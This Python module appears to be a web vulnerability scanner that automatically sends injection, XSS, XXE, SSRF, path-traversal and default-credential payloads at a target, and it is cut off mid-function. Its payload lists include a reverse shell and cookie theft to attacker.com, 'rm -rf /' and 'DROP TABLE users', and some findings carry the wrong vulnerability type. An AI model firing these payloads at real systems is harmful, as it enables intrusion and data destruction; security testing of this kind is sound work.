"""
Security Penetration Testing Engine for ActiveLog Platform

This module provides comprehensive security testing including vulnerability scanning,
authentication bypass attempts, injection testing, and security compliance validation.
"""

from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple, Union
from enum import Enum
import json
import asyncio
import aiohttp
import hashlib
import base64
import random
import string
import re
import ssl
import subprocess
import logging
from pathlib import Path
import urllib.parse
from urllib.parse import urljoin, urlparse, quote
import xml.etree.ElementTree as ET


class VulnerabilityType(Enum):
    """Types of security vulnerabilities to test"""
    SQL_INJECTION = "sql_injection"
    XSS = "cross_site_scripting"
    CSRF = "cross_site_request_forgery"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    AUTHORIZATION_FAILURE = "authorization_failure"
    SESSION_MANAGEMENT = "session_management"
    INSECURE_DIRECT_OBJECT_REFERENCES = "insecure_direct_object_references"
    SECURITY_MISCONFIGURATION = "security_misconfiguration"
    SENSITIVE_DATA_EXPOSURE = "sensitive_data_exposure"
    BROKEN_ACCESS_CONTROL = "broken_access_control"
    KNOWN_VULNERABILITIES = "known_vulnerabilities"
    INSUFFICIENT_LOGGING = "insufficient_logging"
    SERVER_SIDE_REQUEST_FORGERY = "server_side_request_forgery"
    XML_EXTERNAL_ENTITIES = "xml_external_entities"
    INSECURE_DESERIALIZATION = "insecure_deserialization"


class SeverityLevel(Enum):
    """Severity levels for vulnerabilities"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFORMATIONAL = "informational"


class TestCategory(Enum):
    """Categories of security tests"""
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    INPUT_VALIDATION = "input_validation"
    SESSION_MANAGEMENT = "session_management"
    CONFIGURATION = "configuration"
    CRYPTOGRAPHY = "cryptography"
    ERROR_HANDLING = "error_handling"
    BUSINESS_LOGIC = "business_logic"
    CLIENT_SIDE = "client_side"
    SERVER_SIDE = "server_side"


@dataclass
class SecurityTest:
    """Individual security test definition"""
    test_id: str
    name: str
    description: str
    vulnerability_type: VulnerabilityType
    category: TestCategory
    severity: SeverityLevel
    test_method: str  # Function name to execute
    target_endpoints: List[str]
    payloads: List[str] = field(default_factory=list)
    headers: Dict[str, str] = field(default_factory=dict)
    parameters: Dict[str, Any] = field(default_factory=dict)
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)
    requires_authentication: bool = False
    timeout: float = 30.0


@dataclass
class SecurityFinding:
    """Security vulnerability finding"""
    finding_id: str
    test_id: str
    vulnerability_type: VulnerabilityType
    severity: SeverityLevel
    title: str
    description: str
    affected_url: str
    request_data: Dict[str, Any]
    response_data: Dict[str, Any]
    evidence: List[str] = field(default_factory=list)
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    cvss_score: Optional[float] = None
    discovered_at: datetime = field(default_factory=datetime.now)


@dataclass
class SecurityTestReport:
    """Comprehensive security test report"""
    report_id: str
    target_url: str
    start_time: datetime
    end_time: Optional[datetime] = None
    total_tests: int = 0
    tests_passed: int = 0
    tests_failed: int = 0
    vulnerabilities_found: int = 0
    findings: List[SecurityFinding] = field(default_factory=list)
    scan_summary: Dict[str, Any] = field(default_factory=dict)
    risk_assessment: Dict[str, Any] = field(default_factory=dict)


class PayloadGenerator:
    """Generates security test payloads"""
    
    def __init__(self):
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' UNION SELECT null, username, password FROM users --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "1' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a",
            "' OR 1=1#",
            "' OR 'x'='x",
            "admin'--",
            "admin' /*",
            "' OR 1=1 LIMIT 1 --",
            "1' WAITFOR DELAY '00:00:05' --"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input type=image src=x onerror=alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<script>document.cookie='XSS=test'</script>",
            "<script>window.location='http://attacker.com/'+document.cookie</script>"
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            "; ping -c 4 127.0.0.1",
            "; curl http://attacker.com/",
            "&& nc -e /bin/bash attacker.com 4444",
            "; rm -rf /",
            "| id",
            "&& id"
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....//....//....//....//etc/passwd",
            "../../../../../boot.ini",
            "../../../../../etc/shadow",
            "../../../../../../windows/win.ini",
            "file:///etc/passwd",
            "/var/www/../../../etc/passwd"
        ]
        
        self.xxe_payloads = [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.txt">]><root>&xxe;</root>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root></root>',
        ]
        
        self.ssrf_payloads = [
            "http://127.0.0.1:8080",
            "http://localhost:22",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
            "gopher://127.0.0.1:25/",
            "dict://127.0.0.1:11211/",
            "http://0.0.0.0:8080",
            "http://[::1]:8080"
        ]
    
    def get_payloads(self, vulnerability_type: VulnerabilityType) -> List[str]:
        """Get payloads for specific vulnerability type"""
        payload_map = {
            VulnerabilityType.SQL_INJECTION: self.sql_payloads,
            VulnerabilityType.XSS: self.xss_payloads,
            VulnerabilityType.XML_EXTERNAL_ENTITIES: self.xxe_payloads,
            VulnerabilityType.SERVER_SIDE_REQUEST_FORGERY: self.ssrf_payloads
        }
        return payload_map.get(vulnerability_type, [])
    
    def generate_random_payload(self, length: int = 100) -> str:
        """Generate random payload for fuzzing"""
        chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;':\",./<>?"
        return ''.join(random.choice(chars) for _ in range(length))


class AuthenticationTester:
    """Tests authentication mechanisms"""
    
    def __init__(self, session: aiohttp.ClientSession):
        self.session = session
    
    async def test_weak_credentials(self, login_url: str) -> List[SecurityFinding]:
        """Test for weak default credentials"""
        findings = []
        
        weak_credentials = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("test", "test"),
            ("guest", "guest"),
            ("user", "user"),
            ("admin", ""),
            ("", "admin"),
            ("admin", "admin123")
        ]
        
        for username, password in weak_credentials:
            try:
                login_data = {"username": username, "password": password}
                async with self.session.post(login_url, json=login_data) as response:
                    response_text = await response.text()
                    
                    if response.status == 200 and ("success" in response_text.lower() or "dashboard" in response_text.lower()):
                        findings.append(SecurityFinding(
                            finding_id=f"weak_creds_{username}_{password}",
                            test_id="weak_credentials",
                            vulnerability_type=VulnerabilityType.AUTHENTICATION_BYPASS,
                            severity=SeverityLevel.CRITICAL,
                            title="Weak Default Credentials",
                            description=f"Application accepts weak credentials: {username}/{password}",
                            affected_url=login_url,
                            request_data={"credentials": f"{username}:{password}"},
                            response_data={"status": response.status},
                            remediation="Enforce strong password policies and disable default accounts"
                        ))
            except Exception as e:
                logging.debug(f"Error testing credentials {username}:{password} - {e}")
        
        return findings
    
    async def test_brute_force_protection(self, login_url: str) -> List[SecurityFinding]:
        """Test for brute force protection"""
        findings = []
        
        # Attempt multiple failed logins
        failed_attempts = 0
        for i in range(10):
            try:
                login_data = {"username": "admin", "password": f"wrong_password_{i}"}
                async with self.session.post(login_url, json=login_data) as response:
                    if response.status == 401 or response.status == 403:
                        failed_attempts += 1
                    
                    # Check if account gets locked or rate limited
                    response_text = await response.text()
                    if "locked" in response_text.lower() or "rate limit" in response_text.lower():
                        return findings  # Protection exists
                
                # Brief delay between attempts
                await asyncio.sleep(0.5)
            except Exception as e:
                logging.debug(f"Error in brute force test attempt {i} - {e}")
        
        # If we got here, no protection was detected
        if failed_attempts >= 10:
            findings.append(SecurityFinding(
                finding_id="no_brute_force_protection",
                test_id="brute_force_protection",
                vulnerability_type=VulnerabilityType.AUTHENTICATION_BYPASS,
                severity=SeverityLevel.MEDIUM,
                title="No Brute Force Protection",
                description="Application does not implement brute force protection mechanisms",
                affected_url=login_url,
                request_data={"failed_attempts": failed_attempts},
                response_data={},
                remediation="Implement account lockout, CAPTCHA, or rate limiting after failed login attempts"
            ))
        
        return findings
    
    async def test_session_fixation(self, login_url: str) -> List[SecurityFinding]:
        """Test for session fixation vulnerability"""
        findings = []
        
        try:
            # Get session ID before login
            async with self.session.get(login_url.replace("/login", "/")) as response:
                pre_login_cookies = response.cookies
                pre_login_session = pre_login_cookies.get("sessionid") or pre_login_cookies.get("JSESSIONID")
            
            # Perform login
            login_data = {"username": "testuser", "password": "testpassword"}
            async with self.session.post(login_url, json=login_data) as response:
                post_login_cookies = response.cookies
                post_login_session = post_login_cookies.get("sessionid") or post_login_cookies.get("JSESSIONID")
                
                # Check if session ID changed
                if pre_login_session and post_login_session and pre_login_session.value == post_login_session.value:
                    findings.append(SecurityFinding(
                        finding_id="session_fixation",
                        test_id="session_fixation",
                        vulnerability_type=VulnerabilityType.SESSION_MANAGEMENT,
                        severity=SeverityLevel.MEDIUM,
                        title="Session Fixation Vulnerability",
                        description="Application does not regenerate session ID after login",
                        affected_url=login_url,
                        request_data={"pre_login_session": str(pre_login_session)},
                        response_data={"post_login_session": str(post_login_session)},
                        remediation="Regenerate session ID after successful authentication"
                    ))
        except Exception as e:
            logging.debug(f"Error in session fixation test - {e}")
        
        return findings


class InjectionTester:
    """Tests for injection vulnerabilities"""
    
    def __init__(self, session: aiohttp.ClientSession, payload_generator: PayloadGenerator):
        self.session = session
        self.payload_generator = payload_generator
    
    async def test_sql_injection(self, url: str, parameters: Dict[str, str]) -> List[SecurityFinding]:
        """Test for SQL injection vulnerabilities"""
        findings = []
        payloads = self.payload_generator.get_payloads(VulnerabilityType.SQL_INJECTION)
        
        for param_name, original_value in parameters.items():
            for payload in payloads:
                try:
                    # Test in URL parameter
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    async with self.session.get(url, params=test_params) as response:
                        response_text = await response.text()
                        
                        # Check for SQL error indicators
                        sql_errors = [
                            "sql syntax", "mysql_fetch", "ora-", "microsoft jet database",
                            "odbc driver", "sqlite_", "postgresql", "warning: mysql",
                            "valid mysql result", "mysqlclient", "microsoft access driver",
                            "jdbc", "sqlstate", "ora-00", "database error", "sql server"
                        ]
                        
                        for error_indicator in sql_errors:
                            if error_indicator.lower() in response_text.lower():
                                findings.append(SecurityFinding(
                                    finding_id=f"sql_injection_{param_name}_{hash(payload)}",
                                    test_id="sql_injection",
                                    vulnerability_type=VulnerabilityType.SQL_INJECTION,
                                    severity=SeverityLevel.CRITICAL,
                                    title="SQL Injection Vulnerability",
                                    description=f"Parameter '{param_name}' appears vulnerable to SQL injection",
                                    affected_url=url,
                                    request_data={"parameter": param_name, "payload": payload},
                                    response_data={"status": response.status, "error_found": error_indicator},
                                    evidence=[response_text[:500]],
                                    remediation="Use parameterized queries and input validation"
                                ))
                                break
                
                except Exception as e:
                    logging.debug(f"Error testing SQL injection on {param_name} - {e}")
        
        return findings
    
    async def test_xss(self, url: str, parameters: Dict[str, str]) -> List[SecurityFinding]:
        """Test for Cross-Site Scripting vulnerabilities"""
        findings = []
        payloads = self.payload_generator.get_payloads(VulnerabilityType.XSS)
        
        for param_name, original_value in parameters.items():
            for payload in payloads:
                try:
                    # Test reflected XSS
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    async with self.session.get(url, params=test_params) as response:
                        response_text = await response.text()
                        
                        # Check if payload is reflected in response
                        if payload in response_text:
                            findings.append(SecurityFinding(
                                finding_id=f"xss_{param_name}_{hash(payload)}",
                                test_id="xss",
                                vulnerability_type=VulnerabilityType.XSS,
                                severity=SeverityLevel.HIGH,
                                title="Cross-Site Scripting (XSS) Vulnerability",
                                description=f"Parameter '{param_name}' reflects user input without proper sanitization",
                                affected_url=url,
                                request_data={"parameter": param_name, "payload": payload},
                                response_data={"status": response.status},
                                evidence=[f"Payload reflected: {payload}"],
                                remediation="Implement proper input validation and output encoding"
                            ))
                    
                    # Test stored XSS (POST request)
                    if url.endswith("/api/") or "api" in url:
                        post_data = {param_name: payload}
                        async with self.session.post(url, json=post_data) as response:
                            if response.status < 400:
                                # Check if stored by making another request
                                async with self.session.get(url) as get_response:
                                    get_text = await get_response.text()
                                    if payload in get_text:
                                        findings.append(SecurityFinding(
                                            finding_id=f"stored_xss_{param_name}_{hash(payload)}",
                                            test_id="stored_xss",
                                            vulnerability_type=VulnerabilityType.XSS,
                                            severity=SeverityLevel.CRITICAL,
                                            title="Stored Cross-Site Scripting (XSS) Vulnerability",
                                            description=f"Parameter '{param_name}' stores malicious script without sanitization",
                                            affected_url=url,
                                            request_data={"parameter": param_name, "payload": payload},
                                            response_data={"status": response.status},
                                            remediation="Implement input validation, output encoding, and CSP headers"
                                        ))
                
                except Exception as e:
                    logging.debug(f"Error testing XSS on {param_name} - {e}")
        
        return findings
    
    async def test_command_injection(self, url: str, parameters: Dict[str, str]) -> List[SecurityFinding]:
        """Test for command injection vulnerabilities"""
        findings = []
        payloads = self.payload_generator.command_injection_payloads
        
        for param_name, original_value in parameters.items():
            for payload in payloads:
                try:
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    start_time = datetime.now()
                    async with self.session.get(url, params=test_params, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        response_time = (datetime.now() - start_time).total_seconds()
                        response_text = await response.text()
                        
                        # Check for command execution indicators
                        command_indicators = [
                            "root:", "bin/bash", "uid=", "gid=", "groups=",
                            "windows", "system32", "cmd.exe", "powershell"
                        ]
                        
                        for indicator in command_indicators:
                            if indicator.lower() in response_text.lower():
                                findings.append(SecurityFinding(
                                    finding_id=f"command_injection_{param_name}_{hash(payload)}",
                                    test_id="command_injection",
                                    vulnerability_type=VulnerabilityType.INSECURE_DESERIALIZATION,
                                    severity=SeverityLevel.CRITICAL,
                                    title="Command Injection Vulnerability",
                                    description=f"Parameter '{param_name}' allows command execution",
                                    affected_url=url,
                                    request_data={"parameter": param_name, "payload": payload},
                                    response_data={"status": response.status, "response_time": response_time},
                                    evidence=[response_text[:500]],
                                    remediation="Avoid executing system commands with user input; use parameterized APIs"
                                ))
                                break
                        
                        # Check for time-based indicators (e.g., sleep commands)
                        if "ping" in payload or "sleep" in payload or "waitfor" in payload.lower():
                            if response_time > 4:  # Command took longer than expected
                                findings.append(SecurityFinding(
                                    finding_id=f"time_based_injection_{param_name}_{hash(payload)}",
                                    test_id="time_based_injection",
                                    vulnerability_type=VulnerabilityType.INSECURE_DESERIALIZATION,
                                    severity=SeverityLevel.HIGH,
                                    title="Time-based Command Injection",
                                    description=f"Parameter '{param_name}' appears vulnerable to time-based command injection",
                                    affected_url=url,
                                    request_data={"parameter": param_name, "payload": payload},
                                    response_data={"response_time": response_time},
                                    remediation="Implement input validation and avoid system command execution"
                                ))
                
                except asyncio.TimeoutError:
                    # Timeout might indicate successful command execution
                    findings.append(SecurityFinding(
                        finding_id=f"timeout_injection_{param_name}_{hash(payload)}",
                        test_id="timeout_injection",
                        vulnerability_type=VulnerabilityType.INSECURE_DESERIALIZATION,
                        severity=SeverityLevel.MEDIUM,
                        title="Possible Command Injection (Timeout)",
                        description=f"Parameter '{param_name}' caused request timeout, possible command execution",
                        affected_url=url,
                        request_data={"parameter": param_name, "payload": payload},
                        response_data={"timeout": True},
                        remediation="Investigate timeout cause and implement proper input validation"
                    ))
                except Exception as e:
                    logging.debug(f"Error testing command injection on {param_name} - {e}")
        
        return findings


class ConfigurationTester:
    """Tests for security misconfigurations"""
    
    def __init__(self, session: aiohttp.ClientSession):
        self.session = session
    
    async def test_security_headers(self, url: str) -> List[SecurityFinding]:
        """Test for missing security headers"""
        findings = []
        
        try:
            async with self.session.get(url) as response:
                headers = response.headers
                
                # Check for missing security headers
                security_headers = {
                    "X-Frame-Options": "Protects against clickjacking attacks",
                    "X-XSS-Protection": "Enables browser XSS protection",
                    "X-Content-Type-Options": "Prevents MIME type sniffing",
                    "Strict-Transport-Security": "Enforces HTTPS connections",
                    "Content-Security-Policy": "Prevents various injection attacks",
                    "Referrer-Policy": "Controls referrer information",
                    "Feature-Policy": "Controls browser feature usage"
                }
                
                for header, description in security_headers.items():
                    if header not in headers:
                        severity = SeverityLevel.MEDIUM
                        if header in ["Strict-Transport-Security", "Content-Security-Policy"]:
                            severity = SeverityLevel.HIGH
                        
                        findings.append(SecurityFinding(
                            finding_id=f"missing_header_{header.lower().replace('-', '_')}",
                            test_id="security_headers",
                            vulnerability_type=VulnerabilityType.SECURITY_MISCONFIGURATION,
                            severity=severity,
                            title=f"Missing Security Header: {header}",
                            description=f"Missing {header} header. {description}",
                            affected_url=url,
                            request_data={},
                            response_data={"present_headers": list(headers.keys())},
                            remediation=f"Add {header} header to HTTP responses"
                        ))
        
        except Exception as e:
            logging.debug(f"Error testing security headers - {e}")
        
        return findings
    
    async def test_directory_listing(self, base_url: str) -> List[SecurityFinding]:
        """Test for directory listing vulnerabilities"""
        findings = []
        
        common_directories = [
            "/admin/", "/backup/", "/config/", "/uploads/", "/files/",
            "/images/", "/docs/", "/api/", "/tmp/", "/test/",
            "/.git/", "/.svn/", "/logs/", "/database/"
        ]
        
        for directory in common_directories:
            try:
                url = urljoin(base_url, directory)
                async with self.session.get(url) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        # Check for directory listing indicators
                        listing_indicators = [
                            "Index of", "Directory Listing", "Parent Directory",
                            "<pre>", "Last modified", "[DIR]", "<a href="
                        ]
                        
                        if any(indicator in response_text for indicator in listing_indicators):
                            findings.append(SecurityFinding(
                                finding_id=f"directory_listing_{directory.strip('/').replace('/', '_')}",
                                test_id="directory_listing",
                                vulnerability_type=VulnerabilityType.SENSITIVE_DATA_EXPOSURE,
                                severity=SeverityLevel.MEDIUM,
                                title="Directory Listing Enabled",
                                description=f"Directory listing is enabled for {directory}",
                                affected_url=url,
                                request_data={},
                                response_data={"status": response.status},
                                evidence=[response_text[:500]],
                                remediation="Disable directory listing and implement proper access controls"
                            ))
            
            except Exception as e:
                logging.debug(f"Error testing directory {directory} - {e}")
        
        return findings
    
    async def test_sensitive_file_exposure(self, base_url: str) -> List[SecurityFinding]:
        """Test for sensitive file exposure"""
        findings = []
        
        sensitive_files = [
            "/.env", "/config.php", "/web.config", "/app.config",
            "/database.yml", "/.htaccess", "/robots.txt", "/sitemap.xml",
            "/phpinfo.php", "/info.php", "/test.php", "/admin.php",
            "/backup.sql", "/dump.sql", "/config.json", "/settings.json",
            "/.git/config", "/.svn/entries", "/composer.json", "/package.json"
        ]
        
        for file_path in sensitive_files:
            try:
                url = urljoin(base_url, file_path)
                async with self.session.get(url) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        # Check if file contains sensitive information
                        sensitive_patterns = [
                            "password", "secret", "key", "token", "api_key",
                            "database", "mysql", "postgresql", "mongodb",
                            "smtp", "email", "aws", "s3"
                        ]
                        
                        if any(pattern.lower() in response_text.lower() for pattern in sensitive_patterns):
                            findings.append(SecurityFinding(
                                finding_id=f"sensitive_file_{file_path.strip('/').replace('/', '_')}",
                                test_id="sensitive_file_exposure",
                                vulnerability_type=VulnerabilityType.SENSITIVE_DATA_EXPOSURE,
                                severity=SeverityLevel.HIGH,
                                title="Sensitive File Exposure",
                                description=f"Sensitive file {file_path} is publicly accessible",
                                affected_url=url,
                                request_data={},
                                response_data={"status": response.status, "file_size": len(response_text)},
                                evidence=[response_text[:200]],
                                remediation="Remove or protect sensitive files from public access"
                            ))
            
            except Exception as e:
                logging.debug(f"Error testing file {file_path} - {e}")
        
        return findings


class PenetrationTestEngine:
    """Main penetration testing engine"""
    
    def __init__(self, target_url: str, authentication: Optional[Dict[str, str]] = None):
        self.target_url = target_url.rstrip('/')
        self.authentication = authentication
        self.session: Optional[aiohttp.ClientSession] = None
        self.payload_generator = PayloadGenerator()
        self.findings: List[SecurityFinding] = []
        
        # Initialize testers
        self.auth_tester: Optional[AuthenticationTester] = None
        self.injection_tester: Optional[InjectionTester] = None
        self.config_tester: Optional[ConfigurationTester] = None
    
    async def __aenter__(self):
        """Async context manager entry"""
        connector = aiohttp.TCPConnector(ssl=False)  # Disable SSL verification for testing
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30),
            headers={"User-Agent": "ActiveLog-Security-Scanner/1.0"}
        )
        
        # Initialize testers
        self.auth_tester = AuthenticationTester(self.session)
        self.injection_tester = InjectionTester(self.session, self.payload_generator)
        self.config_tester = ConfigurationTester(self.session)
        
        # Authenticate if credentials provided
        if self.authentication:
            await self._authenticate()
        
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.session:
            await self.session.close()
    
    async def _authenticate(self):
        """Authenticate with the target application"""
        try:
            login_url = urljoin(self.target_url, "/auth/login")
            async with self.session.post(login_url, json=self.authentication) as response:
                if response.status == 200:
                    # Store authentication cookies/tokens
                    auth_data = await response.json()
                    if "access_token" in auth_data:
                        self.session.headers.update({
                            "Authorization": f"Bearer {auth_data['access_token']}"
                        })
        except Exception as e:
            logging.warning(f"Authentication failed: {e}")
    
    async def run_comprehensive_scan(self) -> SecurityTestReport:
        """Run comprehensive security scan"""
        report = SecurityTestReport(
            report_id=f"pentest_{int(datetime.now().timestamp())}",
            target_url=self.target_url,
            start_time=datetime.now()
        )
        
        print(f"Starting penetration test on {self.target_url}")
        
        try:
            # 1. Test Authentication
            print("Testing authentication mechanisms...")
            auth_findings = await self._test_authentication()
            self.findings.extend(auth_findings)
            
            # 2. Test for Injection Vulnerabilities
            print("Testing for injection vulnerabilities...")
            injection_findings = await self._test_injections()
            self.findings.extend(injection_findings)
            
            # 3. Test Security Configuration
            print("Testing security configuration...")
            config_findings = await self._test_configuration()
            self.findings.extend(config_findings)
            
            # 4. Test Access Controls
            print("Testing access controls...")
            access_findings = await self._test_access_controls()
            self.findings.extend(access_findings)
            
            # 5. Test Session Management
            print("Testing session management...")
            session_findings = await self._test_session_management()
            self.findings.extend(session_findings)
            
            # 6. Test for Known Vulnerabilities
            print("Testing for known vulnerabilities...")
            known_vuln_findings = await self._test_known_vulnerabilities()
            self.findings.extend(known_vuln_findings)
            
            # Compile report
            report.findings = self.findings
            report.total_tests = len(self.findings)
            report.vulnerabilities_found = len([f for f in self.findings if f.severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH]])
            report.end_time = datetime.now()
            
            # Generate risk assessment
            report.risk_assessment = self._assess_risk()
            
            print(f"Penetration test completed. Found {len(self.findings)} issues.")
            
        except Exception as e:
            logging.error(f"Error during penetration test: {e}")
        
        return report
    
    async def _test_authentication(self) -> List[SecurityFinding]:
        """Test authentication mechanisms"""
        findings = []
        
        login_endpoints = ["/auth/login", "/login", "/api/auth/login", "/signin"]
        
        for endpoint in login_endpoints:
            url = urljoin(self.target_url, endpoint)
            try:
                # Test if endpoint exists
                async with self.session.get(url) as response:
                    if response.status < 404:
                        # Test weak credentials
                        weak_cred_findings = await self.auth_tester.test_weak_credentials(url)
                        findings.extend(weak_cred_findings)
                        
                        # Test brute force protection
                        brute_force_findings = await self.auth_tester.test_brute_force_protection(url)
                        findings.extend(brute_force_findings)
                        
                        # Test session fixation
                        session_fix_findings = await self.auth_tester.test_session_fixation(url)
                        findings.extend(session_fix_findings)
                        
                        break  # Found working login endpoint
            except Exception as e:
                logging.debug(f"Error testing auth endpoint {endpoint}: {e}")
        
        return findings
    
    async def _test_injections(self) -> List[SecurityFinding]:
        """Test for injection vulnerabilities"""
        findings = []
        
        # Common endpoints to test
        test_endpoints = [
            "/search", "/api/search", "/user", "/api/user", "/product", "/api/product",
            "/content", "/api/content", "/", "/api/data", "/query"
        ]
        
        for endpoint in test_endpoints:
            url = urljoin(self.target_url, endpoint)
            
            # Common parameters to test
            test_params = {
                "id": "1",
                "search": "test",
                "query": "test",
                "name": "test",
                "user": "test",
                "category": "test"
            }
            
            try:
                # Test SQL injection
                sql_findings = await self.injection_tester.test_sql_injection(url, test_params)
                findings.extend(sql_findings)
                
                # Test XSS
                xss_findings = await self.injection_tester.test_xss(url, test_params)
                findings.extend(xss_findings)
                
                # Test command injection
                cmd_findings = await self.injection_tester.test_command_injection(url, test_params)
                findings.extend(cmd_findings)
                
            except Exception as e:
                logging.debug(f"Error testing injections on {endpoint}: {e}")
        
        return findings
    
    async def _test_configuration(self) -> List[SecurityFinding]:
        """Test security configuration"""
        findings = []
        
        try:
            # Test security headers
            header_findings = await self.config_tester.test_security_headers(self.target_url)
            findings.extend(header_findings)
            
            # Test directory listing
            dir_findings = await self.config_tester.test_directory_listing(self.target_url)
            findings.extend(dir_findings)
            
            # Test sensitive file exposure
            file_findings = await self.config_tester.test_sensitive_file_exposure(self.target_url)
            findings.extend(file_findings)
            
        except Exception as e:
            logging.debug(f"Error testing configuration: {e}")
        
        return findings
    
    async def _test_access_controls(self) -> List[SecurityFinding]:
        """Test access control mechanisms"""
        findings = []
        
        # Test for insecure direct object references
        admin_endpoints = [
            "/admin", "/admin/users", "/admin/settings", "/api/admin",
            "/dashboard/admin", "/management", "/control-panel"
        ]
        
        for endpoint in admin_endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                async with self.session.get(url) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        # Check if admin content is accessible without proper auth
                        admin_indicators = [
                            "admin panel", "user management", "system settings",
                            "control panel", "dashboard", "administration"
                        ]
                        
                        if any(indicator.lower() in response_text.lower() for indicator in admin_indicators):
                            findings.append(SecurityFinding(
                                finding_id=f"broken_access_control_{endpoint.strip('/').replace('/', '_')}",
                                test_id="broken_access_control",
                                vulnerability_type=VulnerabilityType.BROKEN_ACCESS_CONTROL,
                                severity=SeverityLevel.CRITICAL,
                                title="Broken Access Control",
                                description=f"Admin endpoint {endpoint} is accessible without proper authorization",
                                affected_url=url,
                                request_data={},
                                response_data={"status": response.status},
                                remediation="Implement proper access control and authentication checks"
                            ))
            
            except Exception as e:
                logging.debug(f"Error testing access control on {endpoint}: {e}")
        
        return findings
    
    async def _test_session_management(self) -> List[SecurityFinding]:
        """Test session management"""
        findings = []
        
        try:
            # Test session cookie security
            async with self.session.get(self.target_url) as response:
                cookies = response.cookies
                
                for cookie_name, cookie in cookies.items():
                    cookie_issues = []
                    
                    if not cookie.get('secure'):
                        cookie_issues.append("missing Secure flag")
                    
                    if not cookie.get('httponly'):
                        cookie_issues.append("missing HttpOnly flag")
                    
                    if not cookie.get('samesite'):
                        cookie_issues.append("missing SameSite attribute")
                    
                    if cookie_issues:
                        findings.append(SecurityFinding(
                            finding_id=f"insecure_cookie_{cookie_name}",
                            test_id="insecure_cookie",
                            vulnerability_type=VulnerabilityType.SESSION_MANAGEMENT,
                            severity=SeverityLevel.MEDIUM,
                            title="Insecure Cookie Configuration",
                            description=f"Cookie '{cookie_name}' has security issues: {', '.join(cookie_issues)}",
                            affected_url=self.target_url,
                            request_data={},
                            response_data={"cookie_issues": cookie_issues},
                            remediation="Set Secure, HttpOnly, and SameSite attributes on cookies"
                        ))
        
        except Exception as e:
            logging.debug(f"Error testing session management: {e}")
        
        return findings
    
    async def _test_known_vulnerabilities(self) -> List[SecurityFinding]:
        """Test for known vulnerabilities"""
        findings = []
        
        # Test for common vulnerable endpoints
        vulnerable_endpoints = [
            "/phpinfo.php",
            "/server-info",
            "/server-status",
            "/.well-known/security.txt",
            "/crossdomain.xml",
            "/clientaccesspolicy.xml"
        ]
        
        for endpoint in vulnerable_endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                async with self.session.get(url) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        if endpoint == "/phpinfo.php" and "PHP Version" in response_text:
                            findings.append(SecurityFinding(
                                finding_id="phpinfo_exposure",
                                test_id="phpinfo_exposure",
                                vulnerability_type=VulnerabilityType.SENSITIVE_DATA_EXPOSURE,
                                severity=SeverityLevel.MEDIUM,
                                title="PHP Info Page Exposed",
                                description="PHP configuration information is publicly accessible",
                                affected_url=url,
                                request_data={},
                                response_data={"status": response.status},
                                remediation="Remove or restrict access to phpinfo.php"
                            ))
            
            except Exception as e:
                logging.debug(f"Error testing known vulnerability {endpoint}: {e}")
        
        return findings
    
    def _assess_risk(self) -> Dict[str, Any]:
        """Assess overall security risk"""
        if not self.findings:
            return {"risk_level": "LOW", "score": 0}
        
        # Calculate risk score
        severity_weights = {
            SeverityLevel.CRITICAL: 10,
            SeverityLevel.HIGH: 7,
            SeverityLevel.MEDIUM: 4,
            SeverityLevel.LOW: 2,
            SeverityLevel.INFORMATIONAL: 1
        }
        
        total_score = sum(severity_weights.get(finding.severity, 0) for finding in self.findings)
        max_possible = len(self.findings) * 10
        risk_percentage = (total_score / max_possible) * 100 if max_possible > 0 else 0
        
